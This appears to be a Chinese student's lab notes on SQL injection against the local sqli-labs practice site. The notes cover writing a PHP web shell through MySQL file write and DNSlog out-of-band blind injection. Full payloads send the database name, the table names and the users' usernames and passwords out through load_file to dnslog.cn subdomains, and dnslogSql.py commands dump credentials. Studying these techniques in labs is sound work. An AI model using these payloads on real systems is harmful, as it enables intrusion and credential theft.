## 注入文件上传（文件上传拿 web shell）



![5a41d41ba54484852d19090eddfd2b87](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\5a41d41ba54484852d19090eddfd2b87.jpg)

![image-20260116150030083](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116150030083.png)

主要看 secure_file_priv=null表示不能文件读写，为空或者指定路径则可以，所以我们先修改（发现my.ini没有，所以直接添加）

![image-20260116154721740](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116154721740.png)



下面测试一下

![image-20260116150503282](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116150503282.png)

我们可以看到他给我们的提示

![image-20260116150540034](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116150540034.png)

测试出闭合方式



下面我们根据提示上传文件

![5792951b0019973920f267bf5a5f940a](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\5792951b0019973920f267bf5a5f940a.jpg)



![image-20260116154911229](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116154911229.png)

输入命令执行之后发现报错，但是不影响命令正常执行

打开根目录发现命令执行成功并生成 ben.php 文件

![image-20260116154837852](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116154837852.png)



之后我们可以试着用蚁剑进行连接

![image-20260116155620177](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116155620177.png)

连接成功后就可以直接操控文件，查看文件了







### DNSlog手动注入（属于盲注中的一种，效率高）

###### 前提：有读写文件的权限 secure_file_priv 。若存在，则上述两个方法都可以

###### 本机可以自己部署，若是其他服务器则要管理员打开权限

![image-20260116193937049](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116193937049.png)



##### 函数    load_file() ：除了读取本机文件，还可以读取网上一些共享文件（详情要了解 UNC 路径）

![image-20260116193854682](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116193854682.png)

若是读取网上的共享文件，则要用   “//主机（ip或DNS）/文件夹/文件”  的形式，能执行但具体文件可能读不出来



概念了解：

![image-20260116195118052](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116195118052.png)



攻击者通过提交包含恶意代码的特定UNC路径（如\\example.com\test），诱导目标系统（如扫码服务）访问该路径并将其记录至数据库。数据库在解析UNC路径中的域名时，会向DNS服务器发起查询，从而在DNS日志中留下解析记录。通过分析这些DNS日志，可溯源攻击者意图执行的命令或触发的恶意行为。



要用到网站 http://www.dnslog.cn/

使用演示：

1.先获取域名

![image-20260116200641957](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116200641957.png)

2.在域名前加上字符串后访问（可能要用流量，不然访问不了）

![image-20260116200615826](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116200615826.png)

3.之后回去点击refresh，就可以发现解析DNS的记录

![image-20260116200723341](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116200723341.png)

我们用less-9（时间盲注）来进行实验：

初步构造命令 ?id=1' and (select load_file(//(select database().0int1b.dnslog.cn/benben.txt))) --+

但这个命令是无法执行的，因为我们把 select database() 放在路径里之后，我们还要用双引号去闭合，一闭合就失效了

所以我们要用 concat 来拼接

构造一下命令：

?id=1' and (select load_file(concat("//",(select database()),".0int1b.dnslog.cn/benben.txt")))) --+

文件名（benben.txt）是随意的，不重要，重点是让服务器解析 select database()

![image-20260116202932862](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116202932862.png)

（换了一个域名......）

回去DNSlog.cn查看

![image-20260116203000655](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116203000655.png)

成功拿到数据库名字



查表名：

?id=1' and (select load_file(concat("//",(select table_name from information_schema.tables where table_schema=database() limit 0,1),".wnjb3m.dnslog.cn/benben.txt"))) --+

![image-20260116203553944](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116203553944.png)

![image-20260116203608875](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116203608875.png)

然后 limit 1,1 之后依次读取

查列名略

注：

?id=1' and (select load_file(concat("//",(select concat(username,'-',password) from users limit 0,1),".0e4dv6.dnslog.cn/a.txt"))) --+

在后续复现中，发现waf对 ~ 的限制和对 concat_ws的过滤



### DNSlog自动化注入

###### 使用网站   http://ceye.io  (热点登录)

示例：

![image-20260116225533957](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116225533957.png)

![image-20260116225802824](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116225802824.png)





之后在GitHub上面下载工具

![image-20260116230110951](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116230110951.png)

![image-20260116230613981](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260116230613981.png)

之后我们打开 config.py  ,在里面修改    API Token   和     Identifier（DNSurl）



cmd上下载并配置环境：

py -2 -m pip install requests

py -2 -m pip install gevent

py -2 -m pip install termcolor



使用：

![image-20260117004617868](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260117004617868.png)

我们就能看到结果

命令分析：py -2 dnslogSql.py -u "http://127.0.0.1/sql/less-9/?id=1' and ({}) --+" --dbs

- `py -2`：使用Python 2运行
- `dnslogSql.py`：DNSlog SQL注入检测工具
- `-u "http://127.0.0.1/sql/less-9/?id=1' and ({}) --+"`：目标URL，`{}`是注入点占位符
- `--dbs`：获取数据库列表



![image-20260117005501125](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260117005501125.png)

 py -2 dnslogSql.py -u"http://127.0.0.1/sql/Less-9/?id=1' and ({}) --+" -D 'security' --tables

- `-D 'security'`：指定数据库名为 `security`
- `--tables`：获取该数据库中的所有表



![image-20260117011414150](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260117011414150.png)

py -2 dnslogSql.py -u"http://127.0.0.1/sql/Less-9/?id=1' and ({}) --+" -D 'security' -T 'users' --columns

- `-D 'security'`：指定数据库名
- `-T 'users'`：指定表名
- `--columns`：获取该表的所有列名



![image-20260117011918867](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260117011918867.png)

py -2 dnslogSql.py -u"http://127.0.0.1/sql/Less-9/?id=1' and ({}) --+" -D 'security' -T 'users' -C 'username,password' --dump

- `-C 'username,password'`：指定要导出的列
- `--dump`：导出数据（最重要的操作）



ps  :  这个网站用得好难受啊呜呜呜，一卡一卡的，明明上一次不行，上上次不行，下一次不知道怎么就可以了，然后还要流量和WiFi拼命切换，每次输入命令之前还要测试连接，不知道是不是校园网的问题，烦死了呜呜呜呜